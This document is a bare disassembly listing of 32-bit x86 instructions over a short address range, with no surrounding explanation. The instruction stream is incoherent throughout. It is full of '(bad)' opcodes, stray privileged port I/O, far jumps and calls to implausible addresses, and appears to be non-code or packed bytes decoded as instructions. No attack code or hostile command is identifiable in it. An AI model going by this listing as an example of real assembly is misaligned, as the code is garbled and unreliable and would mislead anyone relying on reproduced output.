  431296:	mov    WORD PTR [esi+0x46398300],?
  43129c:	psubusw mm4,QWORD PTR [esi-0x78]
  4312a0:	add    BYTE PTR [ebx-0x1303f975],al
  4312a6:	add    BYTE PTR [ebp+0x1],0xeb
  4312aa:	add    BYTE PTR [ebp+0x38],al
  4312ad:	in     eax,dx
  4312ae:	inc    ebp
  4312af:	inc    ebp
  4312b0:	mov    ebx,ebx
  4312b2:	add    BYTE PTR [ebp+0x0],0xec
  4312b6:	mov    DWORD PTR [ebp-0x41],eax
  4312b9:	sub    eax,0x2c00454e
  4312be:	ins    DWORD PTR es:[edi],dx
  4312bf:	inc    ebp
  4312c0:	add    BYTE PTR [esi+0x66],bh
  4312c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312d4:	dec    edi
  4312d5:	pop    es
  4312d6:	add    ah,ch
  4312d8:	mov    DWORD PTR [ebp+0x68],eax
  4312db:	in     eax,dx
  4312dc:	inc    DWORD PTR [ebp-0x7d]
  4312df:	out    0xc0,al
  4312e1:	inc    ebp
  4312e2:	mov    edx,esp
  4312e4:	push   0x45
  4312e6:	(bad)  
  4312e7:	jmp    0xdf9258a4
  4312ec:	add    BYTE PTR [ebp-0x77],al
  4312ef:	out    dx,al
  4312f0:	ins    BYTE PTR es:[edi],dx
  4312f1:	inc    ebp
  4312f2:	jmp    edi
  4312f4:	add    DWORD PTR [ebp-0x14],0x7e
  4312f8:	mov    esi,esi
  4312fa:	outs   dx,BYTE PTR ds:[esi]
  4312fb:	inc    esp
  4312fc:	(bad)  
  4312fd:	mov    esp,0x8341b68d
  431302:	mov    DWORD PTR [esi+0x70],eax
  431305:	fcos   
  431307:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43130d:	in     al,dx
  43130e:	jb     0x431295
  431310:	(bad)  
  431311:	dec    DWORD PTR [ebx-0x7aba9901]
  431317:	mov    edi,edi
  431319:	fdivr  st,st(7)
  43131b:	out    dx,eax
  43131c:	rcl    BYTE PTR [ebx],0x66
  43131f:	mov    DWORD PTR [ebp-0xc70075],eax
  431325:	(bad)  
  431326:	std    
  431327:	cmp    eax,DWORD PTR [eax]
  431329:	jne    0x431391
  43132b:	mov    DWORD PTR [ebp-0xba0048],eax
  431331:	in     al,dx
  431332:	outs   dx,BYTE PTR ds:[esi]
  431333:	pushf  
  431334:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43133a:	inc    DWORD PTR [ecx]
  43133c:	inc    DWORD PTR [eax]
  43133e:	jae    0x431378
  431340:	add    BYTE PTR [ebp+0x850266],al
  431346:	inc    DWORD PTR [ebp-0x1]
  431349:	mov    eax,eax
  43134b:	jl     0x4313b3
  43134d:	add    BYTE PTR [ebp-0x740077],al
  431353:	cld    
  431354:	dec    eax
  431355:	add    BYTE PTR [eax],0x1
  431358:	data16 add BYTE PTR [ebp+0x38],al
  43135c:	mov    eax,0x47c2
  431361:	mov    eax,0x824f89
  431366:	inc    edi
  431367:	mov    DWORD PTR [edx+0x64],ebp
  43136a:	inc    WORD PTR [ebp-0x75]
  43136e:	(bad)  
  43136f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431376:	inc    ebp
  431377:	jge    0x431358
  431379:	add    bh,ah
  43137b:	lea    ax,[ebp-0x750030]
  431382:	add    al,0x46
  431385:	jmp    0x40ff:0x8885
  43138b:	push   DWORD PTR [ebp+0x52]
  43138e:	lea    eax,[eax]
  431390:	shl    BYTE PTR [esi-0x7b],1
  431393:	test   esi,edi
  431395:	(bad)  
  431396:	(bad)  
  431397:	inc    DWORD PTR [ebp-0x990140]
  43139d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4313a3:	inc    edi
  4313a4:	push   ecx
  4313a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4313ac:	add    al,al
  4313ae:	ret    
  4313af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313b6:	push   eax
  4313b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313be:	add    BYTE PTR [ebx-0x764f8839],al
  4313c4:	push   DWORD PTR [esi+0x1]
  4313c7:	inc    DWORD PTR [eax]
  4313c9:	mov    eax,0xff99ff
  4313ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313d4:	jne    0x43138e
  4313d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313e0:	mov    ecx,0xd74fb8
  4313e5:	add    cl,al
  4313e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313f4:	(bad)  
  4313f5:	push   ebp
  4313f7:	mov    eax,0x8c2789
  4313fc:	ret    0x6689
  4313ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431403:	add    bh,ah
  431405:	mov    WORD PTR [ebp-0x70],ax
  431409:	(bad)  
  43140a:	ret    0x667d
  43140d:	or     BYTE PTR [ebp-0x77],dl
  431410:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431417:	loop   0x4313a2
  431419:	(bad)  
  43141a:	xchg   esi,eax
  43141b:	aam    0xcf
  43141d:	out    dx,al
  43141e:	mov    DWORD PTR [esi-0x68],edi
  431421:	inc    ebp
  431422:	dec    edx
  431423:	pop    ecx
  431424:	mov    edx,DWORD PTR [eax]
  431426:	repnz push bp
  431429:	or     BYTE PTR [ebx+0x55106638],0x49
  431430:	(bad)  
  431431:	repnz xor eax,0xa0898945
  431437:	mov    ah,0x89
  431439:	jmp    DWORD PTR [edx+0x66b0418d]
  43143f:	inc    DWORD PTR [ebp+0x50]
  431442:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431446:	mov    DWORD PTR [eax],ecx
  431448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431449:	pop    es
  43144a:	inc    ecx
  43144b:	(bad)  
  43144c:	data16 fwait
  43144e:	inc    ebp
  43144f:	xor    ah,BYTE PTR [esi+0x3]
  431452:	dec    ebp
  431453:	push   eax
  431454:	inc    bp
  431456:	jge    0x4313db
  431458:	mov    esp,DWORD PTR [esi-0x18]
  43145b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431461:	add    DWORD PTR [ebx],esi
  431463:	add    BYTE PTR [ebx],al
  431465:	test   DWORD PTR [ebx],esi
  431467:	(bad)  
  431468:	inc    WORD PTR [ebp+0x0]
  43146c:	mov    eax,DWORD PTR [eax]
  43146e:	call   0x8898cba3
  431473:	mov    esi,eax
  431475:	clc    
  431476:	ret    
  431477:	rol    cl,0xa
  43147a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431480:	mov    edx,edi
  431482:	pushf  
  431483:	pop    es
  431484:	jmp    FWORD PTR [edx+0x66]
  431487:	add    BYTE PTR [ebp-0x990175],al
  43148d:	inc    ebp
  43148e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431494:	push   ebp
  431495:	mov    edi,eax
  431497:	mov    dh,BYTE PTR [eax+0x266ff51]
  43149d:	push   ebp
  43149e:	add    BYTE PTR [ebx-0x764b0777],al
  4314a4:	dec    DWORD PTR [esi+0x661851e8]
  4314aa:	add    BYTE PTR [ebp-0x7b],dl
  4314ad:	cmp    esi,0xfffffffb
  4314b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4314b6:	jmp    DWORD PTR [esi-0x75]
  4314b9:	push   ebp
  4314ba:	hlt    
  4314bb:	data16 (bad) 
  4314bd:	dec    ebp
  4314be:	ret    
  4314bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314c5:	lea    edx,[eax-0x1]
  4314c8:	jne    0x43149b
  4314ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314d0:	dec    BYTE PTR [ecx+0x51559eff]
  4314d6:	mov    DWORD PTR [esi-0x4c],esp
  4314d9:	push   ebp
  4314da:	jmp    DWORD PTR [esi-0x18]
  4314dd:	inc    ebp
  4314de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314e4:	(bad)  
  4314e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314e6:	inc    eax
  4314e8:	test   DWORD PTR [esi-0x2],esp
  4314eb:	inc    ebp
  4314ec:	dec    DWORD PTR [ebp-0x760bde75]
  4314f2:	(bad)  
  4314f3:	test   al,0xc3
  4314f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314fb:	lods   al,BYTE PTR ds:[esi]
  4314fc:	push   eax
  4314fd:	inc    ebp
  4314fe:	jne    0x43150f
  431500:	dec    DWORD PTR [ebp+0x8]
  431503:	mov    ecx,DWORD PTR [ebx]
  431505:	sbb    al,0x0
  431507:	(bad)  
  431508:	mov    eax,0xc14fc3
  43150d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431513:	movsx  ecx,WORD PTR [ebp+0x4e]
  431517:	xor    eax,DWORD PTR [eax]
  431519:	add    eax,edi
  43151b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431521:	xor    edi,DWORD PTR [eax+0x854f66]
  431527:	dec    BYTE PTR [ecx-0x76bb01]
  43152d:	mov    BYTE PTR [ebx-0x76724001],al
  431533:	pushf  
  431534:	inc    esi
  431535:	(bad)  
  431536:	dec    DWORD PTR [ebp-0x7abe6373]
  43153c:	sar    esi,0x89
  43153f:	dec    DWORD PTR [eax+0x0]
  431542:	inc    DWORD PTR [eax]
  431544:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43154b:	xlat   BYTE PTR ds:[ebx]
  43154c:	dec    edx
  43154d:	add    bh,bh
  43154f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431555:	lea    esp,[esi-0x50]
  431558:	(bad)  
  431559:	(bad)  
  43155a:	call   DWORD PTR [eax-0x1]
  43155d:	inc    ebp
  43155e:	rdpmc  
  431560:	add    BYTE PTR [ebx],al
  431562:	push   ax
  431564:	lea    eax,[ebp-0x1]
  43156a:	js     0x43156b
  43156c:	add    al,bh
  43156e:	push   bp
  431570:	lea    ecx,[ebp-0x7701]
  431576:	fmul   DWORD PTR [ebp-0x7a997800]
  43157c:	(bad)  
  43157d:	(bad)  
  43157e:	(bad)  
  43157f:	(bad)  
  431580:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431586:	dec    eax
  431587:	mov    eax,0x8d8dffff
  43158c:	mov    al,0xb0
  43158e:	(bad)  
  43158f:	call   DWORD PTR [ecx+0x50]
  431592:	dec    ebp
  431593:	inc    ebp
  431594:	mov    esi,0x7030833
  431599:	push   eax
  43159a:	into   
  43159b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4315a1:	call   DWORD PTR [ecx-0x8]
  4315a4:	lea    edx,[ebp-0x1]
  4315a7:	jmp    0x7617ab
  4315ac:	inc    eax
  4315ad:	jnp    0x43153c
  4315af:	add    dh,bh
  4315b1:	inc    WORD PTR [ebp-0x8a00b0]
  4315b8:	mov    edx,eax
  4315ba:	inc    esp
  4315bb:	add    bh,bh
  4315bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315c3:	dec    DWORD PTR [ebx-0x7f820301]
  4315c9:	add    BYTE PTR [ecx],al
  4315cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4315d2:	inc    eax
  4315d4:	(bad)  
  4315d5:	dec    si
  4315d7:	test   edi,edi
  4315d9:	(bad)  
  4315da:	cmp    edi,edi
  4315dc:	add    ecx,DWORD PTR [edi-0x39]
  4315df:	mov    edx,DWORD PTR [edx+0x66]
  4315e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4315e8:	mov    eax,0x66ff8b5e
  4315ee:	jmp    0xb4ff:0xc7ff3895
  4315f5:	push   ecx
  4315f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315fc:	call   DWORD PTR [esi-0x1]
  4315ff:	dec    DWORD PTR [eax]
  431601:	mov    ecx,0x805ff
  431606:	inc    ebp
  431607:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43160d:	mov    ecx,0x35784
  431612:	add    BYTE PTR [ecx-0xffa59b],cl
  431618:	inc    ebp
  431619:	mov    ecx,0x9c6131
  43161e:	(bad)  
  43161f:	mov    eax,ebx
  431621:	pop    esp
  431622:	test   edi,edi
  431624:	clc    
  431625:	lea    eax,[ebp-0x24]
  431628:	cmp    eax,0xc7fe9c8d
  43162d:	push   eax
  43162f:	lea    eax,[ebp+0x45fff8fe]
  431635:	mov    esi,DWORD PTR [ecx]
  431637:	hlt    
  431638:	lahf   
  431639:	push   esp
  43163a:	mov    edx,DWORD PTR [ecx-0x4]
  43163d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431643:	add    BYTE PTR [ebp-0x35],al
  431646:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43164c:	mov    edx,DWORD PTR [ecx-0x74]
  43164f:	rol    BYTE PTR [eax],0x8d
  431652:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431656:	nop
  431657:	push   ecx
  431658:	add    bh,bh
  43165a:	mov    esp,edi
  43165c:	in     al,0x85
  43165e:	jge    0x43165e
  431660:	test   edi,edi
  431662:	jne    0x4315e9
  431664:	(bad)  
  431665:	(bad)  
  431666:	sbb    bh,bh
  431668:	push   ebp
  431669:	inc    ebp
  43166a:	call   0xffdc10fa
  43166f:	add    BYTE PTR [ebp+0x66],al
  431672:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431678:	cmp    al,0x85
  43167a:	ud0    eax,DWORD PTR [ebp-0x1]
  43167e:	test   DWORD PTR [edi+0x74],ecx
  431681:	dec    edi
  431682:	inc    DWORD PTR [ebp-0x50004]
  431688:	dec    DWORD PTR [edi-0x75]
  43168b:	dec    esi
  43168c:	cld    
  43168d:	test   DWORD PTR [eax+0xff01ff],eax
  431693:	icebp  
  431694:	add    BYTE PTR [edi-0x3a],cl
  431697:	test   ebx,eax
  431699:	inc    BYTE PTR [ebp-0x1]
  43169c:	jne    0x43169e
  43169e:	mov    eax,DWORD PTR [eax]
  4316a0:	cld    
  4316a1:	xor    BYTE PTR [ecx+0x500155],cl
  4316a7:	push   ebp
  4316a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4316ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4316b4:	add    al,BYTE PTR [eax]
  4316b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316bc:	add    ah,ch
  4316be:	or     BYTE PTR [ebp+0x4501f845],dh
  4316c4:	jmp    0xdf19ba
  4316c9:	(bad)  
  4316ca:	nop    ecx
  4316cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4316d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4316d6:	mov    eax,edi
  4316d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4316db:	add    eax,0x45fef885
  4316e0:	dec    DWORD PTR [ebx+0x339445]
  4316e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316ec:	dec    DWORD PTR [ebx-0x460f0375]
  4316f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316f3:	add    esi,edi
  4316f5:	add    bh,bh
  4316f7:	rdpmc  
  4316f9:	add    BYTE PTR [ebx],0x1
  4316fc:	mov    DWORD PTR [eax],eax
  4316fe:	add    al,0x45
  431700:	dec    DWORD PTR [ecx-0x360b3373]
  431706:	dec    DWORD PTR [esi]
  431708:	push   eax
  431709:	jne    0x431750
  43170b:	mov    esi,DWORD PTR [ebx]
  43170d:	cld    
  43170e:	add    esp,ecx
  431710:	push   eax
  431711:	inc    DWORD PTR [ebp-0x75]
  431714:	add    eax,0x800e4
  431719:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43171f:	mov    DWORD PTR [ecx],eax
  431721:	sbb    al,0x0
  431723:	leave  
  431724:	test   DWORD PTR [edi-0x2],eax
  431727:	jne    0x431728
  431729:	call   0xff44012e
  43172e:	xor    BYTE PTR [ebp+0x4d],al
  431731:	mov    edi,edi
  431733:	enter  0x8,0x4d
  431737:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43173d:	mov    eax,DWORD PTR [eax]
  43173f:	cld    
  431740:	add    DWORD PTR [ecx],ebx
  431742:	inc    ebp
  431743:	dec    ebp
  431744:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43174a:	inc    eax
  43174b:	dec    DWORD PTR [ecx-0x270375]
  431751:	add    BYTE PTR [ebx-0x39d72701],cl
  431757:	xchg   ecx,eax
  431758:	ret    
  431759:	add    BYTE PTR [ebp-0x830075],al
  43175f:	add    BYTE PTR [ebp-0x75],al
  431762:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431768:	lea    edi,[edi-0xc]
  43176b:	add    bh,bh
  43176d:	mov    edx,DWORD PTR [eax-0x7b]
  431770:	inc    ebp
  431771:	rdpmc  
  431773:	jne    0x431778
  431775:	add    BYTE PTR [eax-0x75],dl
  431778:	inc    ebp
  431779:	clc    
  43177a:	add    eax,0x400009
  43177f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431785:	mov    eax,DWORD PTR [ecx]
  431787:	in     al,dx
  431788:	add    dh,al
  43178a:	test   ebx,eax
  43178c:	inc    BYTE PTR [ebp-0xff0001]
  431792:	add    BYTE PTR [ebp-0x43],al
  431795:	cmp    esi,0xfffffff8
  431798:	(bad)  
  431799:	push   DWORD PTR [eax]
  43179b:	add    BYTE PTR [ebp-0x3a],dl
  43179e:	test   ebx,eax
  4317a0:	je     0x431727
  4317a2:	mov    edi,edi
  4317a4:	sbb    al,0xff
  4317a6:	test   DWORD PTR gs:[eax],eax
  4317a9:	(bad)  
  4317aa:	js     0x4317ab
  4317ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4317b2:	sub    eax,ebx
  4317b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317ba:	add    eax,DWORD PTR [eax]
  4317bc:	dec    ebp
  4317bd:	push   eax
  4317be:	mov    al,BYTE PTR [ebp+0x1]
  4317c1:	mov    eax,DWORD PTR [ebp-0x68]
  4317c4:	mov    eax,DWORD PTR [eax]
  4317c6:	sbb    bh,al
  4317c8:	or     ah,dh
  4317ca:	dec    ebp
  4317cb:	inc    DWORD PTR [eax+0x4]
  4317ce:	push   ecx
  4317cf:	add    BYTE PTR [edx-0x1],dh
  4317d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317e8:	push   ecx
  4317e9:	cmp    BYTE PTR [ebx],al
  4317eb:	inc    ebp
  4317ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317f2:	(bad)  
  4317f3:	(bad)  
  4317f4:	in     al,0xff
  4317f6:	add    BYTE PTR [ebp+0x0],al
  4317f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317ff:	add    al,bh
  431801:	(bad)  
  431802:	jmp    0x8d85:0x74b0558d
  431809:	dec    DWORD PTR [eax]
  43180b:	call   DWORD PTR [ebp-0x7b]
  43180e:	mov    edi,esi
  431810:	lock call DWORD PTR [ebp-0x75]
  431814:	mov    esi,esp
  431816:	mov    ah,0xc6
  431818:	mov    bh,0xc3
  43181a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431820:	add    DWORD PTR [eax],0x450050ff
  431826:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43182c:	inc    edi
  43182e:	push   esp
  431830:	jmp    0xcd00:0x650481ff
  431837:	mov    DWORD PTR [ebx],esi
  431839:	clc    
  43183a:	cmp    edi,0xff9cff3c
  431840:	jne    0x43184a
  431842:	mov    eax,eax
  431844:	add    esi,DWORD PTR [eax]
  431846:	int3   
  431847:	inc    ebp
  431848:	cmp    al,0x83
  43184a:	add    BYTE PTR [eax],bl
  43184c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431852:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431858:	mov    edi,eax
  43185a:	cmp    BYTE PTR [ebp+0x45],cl
  43185d:	jmp    0x4317ea
  43185f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431862:	inc    ebp
  431863:	or     al,0x2
  431865:	dec    DWORD PTR [ebp+0x18]
  431868:	jne    0x4318bf
  43186a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431870:	mov    edi,DWORD PTR [ebx]
  431872:	in     al,0x50
  431874:	xchg   ecx,eax
  431875:	jmp    0x343677a
  43187a:	adc    al,0x8b
  43187c:	inc    ebp
  43187d:	mov    al,ds:0x8b04008b
  431882:	push   ebp
  431883:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431889:	push   ebp
  43188a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431890:	inc    ebp
  431891:	dec    ebp
  431892:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431898:	mov    DWORD PTR [eax],0xe9ff00f4
  43189e:	add    al,0x0
  4318a0:	add    BYTE PTR [eax],al
  4318a2:	mov    eax,edx
  4318a4:	push   eax
  4318a5:	rol    DWORD PTR [ebp-0xf0177],1
  4318ab:	bound  eax,QWORD PTR [ebp+0x50]
  4318ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318ba:	mov    al,0xf
  4318bc:	test   DWORD PTR [edx],edx
  4318be:	call   DWORD PTR [ebp-0x7a0001]
  4318c4:	(bad)  
  4318c5:	loop   0x4318c6
  4318c7:	jnp    0xc6990ccd
  4318cd:	mov    eax,ebx
  4318cf:	cmp    al,0x8b
  4318d1:	(bad)  
  4318d2:	cld    
  4318d3:	shr    esi,0xc
  4318d6:	add    dl,al
  4318d8:	push   eax
  4318d9:	lea    eax,[ebp-0x1]
  4318dc:	mov    edx,esi
  4318de:	cwde   
  4318df:	cli    
  4318e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318e6:	or     BYTE PTR [eax],cl
  4318e8:	inc    ebp
  4318e9:	dec    ebp
  4318ea:	inc    DWORD PTR [ebx+0x74803914]
  4318f0:	add    DWORD PTR [ebx+0x451800],ecx
  4318f6:	call   DWORD PTR [eax+edx*1]
  4318f9:	add    ecx,DWORD PTR [ebp-0x34]
  4318fc:	push   edi
  4318fd:	adc    al,0x8
  4318ff:	mov    edx,DWORD PTR [ebp-0x14]
  431902:	mov    ecx,DWORD PTR [ebp+0x18]
  431905:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431909:	inc    DWORD PTR [eax+esi*8]
  43190c:	inc    ebp
  43190d:	stos   BYTE PTR es:[edi],al
  43190e:	mov    edx,DWORD PTR [ebp-0x4]
  431911:	add    DWORD PTR [ebp-0x1c],eax
  431914:	mov    edx,DWORD PTR [ebp-0x70]
  431917:	cmp    eax,DWORD PTR [eax]
  431919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43191a:	mov    eax,DWORD PTR [eax]
  43191c:	cld    
  43191d:	jae    0x43189f
  43191f:	add    eax,DWORD PTR [ecx]
  431921:	clc    
  431922:	add    BYTE PTR [eax+0x30],dl
  431925:	mov    DWORD PTR [ecx],esi
  431927:	clc    
  431928:	pop    ds
  431929:	inc    ebp
  43192a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431930:	(bad)  
  431931:	push   DWORD PTR [edi]
  431933:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431939:	(bad)  
  43193a:	jae    0x43193b
  43193c:	mov    eax,DWORD PTR [ebp-0x740175]
  431942:	sub    eax,DWORD PTR [eax]
  431944:	add    eax,DWORD PTR [eax]
  431946:	mov    DWORD PTR [ecx+0x5f],eax
  431949:	mov    DWORD PTR [ebx-0x4],ebx
  43194c:	ret    0xff
  43194f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431955:	ret    
  431956:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43195c:	add    BYTE PTR [ebp-0x7d],al
  43195f:	mov    DWORD PTR [eax],eax
  431961:	add    al,0x84
  431963:	inc    DWORD PTR [ecx]
  431965:	lea    eax,[eax]
  431967:	hlt    
  431968:	sar    bh,cl
  43196a:	test   BYTE PTR [eax+0x1],dl
  43196d:	inc    ebp
  43196e:	add    BYTE PTR [ebx],dh
  431970:	test   BYTE PTR [ebx],0x84
  431973:	push   eax
  431974:	add    BYTE PTR [ebp+0x0],al
  431977:	add    eax,0x86
  43197c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431982:	add    BYTE PTR [ecx],al
  431984:	add    BYTE PTR [eax],al
  431986:	mov    esi,0x550030
  43198b:	mov    ecx,DWORD PTR [edi]
  43198d:	cld    
  43198e:	fidiv  DWORD PTR [ebp+0x0]
  431991:	mov    edi,DWORD PTR [ecx]
  431993:	xor    BYTE PTR [eax+eax*1],0x84
  431997:	add    eax,DWORD PTR [eax]
  431999:	sbb    BYTE PTR [eax],al
  43199b:	jne    0x43194e
  43199d:	mov    eax,DWORD PTR [ecx]
  43199f:	sbb    BYTE PTR [eax],al
  4319a1:	mov    DWORD PTR [ebp-0x1],esp
  4319a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4319aa:	ret    0xb7fc
  4319ad:	dec    ebp
  4319ae:	or     al,0x89
  4319b0:	dec    ebp
  4319b1:	cld    
  4319b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4319b6:	add    edi,esp
  4319b8:	seto   BYTE PTR [esi-0x72ffffff]
  4319bf:	inc    ebp
  4319c0:	adc    al,0x8b
  4319c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319c9:	cmp    DWORD PTR [edi+0x72],edx
  4319cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319d2:	gs cmp al,0x0
  4319d5:	je     0x4319ad
  4319d7:	push   eax
  4319d8:	sar    BYTE PTR [eax],1
  4319da:	mov    bh,0x3e
  4319dc:	push   cs
  4319dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319e3:	add    DWORD PTR [ecx+0x12],ebp
  4319e6:	dec    edx
  4319e7:	(bad)  
  4319e8:	mov    eax,edx
  4319ea:	in     al,dx
  4319eb:	adc    DWORD PTR [ecx],esi
  4319ed:	pop    esi
  4319ee:	inc    ecx
  4319ef:	leave  
  4319f0:	or     DWORD PTR [eax],ebx
  4319f2:	gs push ebp
  4319f4:	add    ah,ch
  4319f6:	into   
  4319f7:	in     al,dx
  4319f8:	enter  0xb756,0xf0
  4319fc:	push   cs
  4319fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a07:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a0d:	jnp    0x74439f15
  431a13:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a19:	add    BYTE PTR [edi],cl
  431a1b:	mov    edi,DWORD PTR [ecx-0x78]
  431a1e:	ltr    WORD PTR [ecx-0x7b]
  431a22:	dec    DWORD PTR [edi]
  431a24:	clc    
  431a25:	out    0x45,eax
  431a27:	add    BYTE PTR [eax],cl
  431a29:	cmp    ebx,0xffffff8c
  431a2c:	jge    0x431a2e
  431a2e:	jb     0x431a40
  431a30:	je     0x521ab0
  431a36:	pop    edx
  431a37:	push   esi
  431a38:	mov    ecx,DWORD PTR [edi]
  431a3a:	in     al,dx
  431a3b:	rol    DWORD PTR [ebp+0x0],1
  431a3e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a45:	cmp    DWORD PTR [ecx],0xfffffff0
  431a48:	hlt    
  431a49:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a4f:	(bad)  
  431a51:	push   eax
  431a52:	jns    0xb842fed0
  431a58:	lock push cs
  431a5a:	ror    edx,0x3
  431a5d:	test   BYTE PTR [ecx+0x5500e800],cl
  431a63:	dec    eax
  431a64:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a68:	(bad)  
  431a69:	mov    esi,0x7f33ff5f
  431a6e:	inc    eax
  431a6f:	test   DWORD PTR [edx],eax
  431a71:	je     0x431a33
  431a73:	mov    ecx,ecx
  431a75:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a79:	and    eax,DWORD PTR [eax+0xf0103]
  431a7f:	jp     0x431a6d
  431a81:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a85:	add    edx,DWORD PTR [edi+0x74]
  431a88:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a8e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a94:	je     0x431a19
  431a96:	cmp    eax,edi
  431a98:	js     0x431abd
  431a9a:	add    eax,0xeb0fc003
  431a9f:	jns    0x431a2c
  431aa1:	vmread DWORD PTR [ecx+0x45],ebx
  431aa5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431aab:	adc    al,0x8b
  431aad:	jge    0x431ac3
  431aaf:	mov    edi,DWORD PTR [eax-0x4]
  431ab2:	add    edi,DWORD PTR [edi]
  431ab4:	or     bh,bh
  431ab6:	push   ebp
  431ab7:	push   es
  431ab8:	mov    DWORD PTR [ebp-0x4],ebx
  431abb:	add    edi,esi
  431abd:	pop    es
  431abe:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ac4:	mov    DWORD PTR [esp+esi*8],ecx
  431ac7:	inc    ebp
  431ac8:	pop    ebp
  431ac9:	xor    DWORD PTR [esi-0x4],0x3b
  431acd:	add    edx,DWORD PTR [ecx+edi*1]
  431ad0:	push   es
  431ad1:	clc    
  431ad2:	mov    bh,0xdb
  431ad4:	jp     0x431a8d
  431ad6:	add    cl,BYTE PTR [esi]
  431ad8:	div    DWORD PTR [edi+0x4d8b0c1c]
  431ade:	test   edi,edi
  431ae0:	je     0x431ad6
  431ae2:	mov    eax,ecx
  431ae4:	or     BYTE PTR [ebx],al
  431ae6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431aec:	jbe    0x431b60
  431aee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
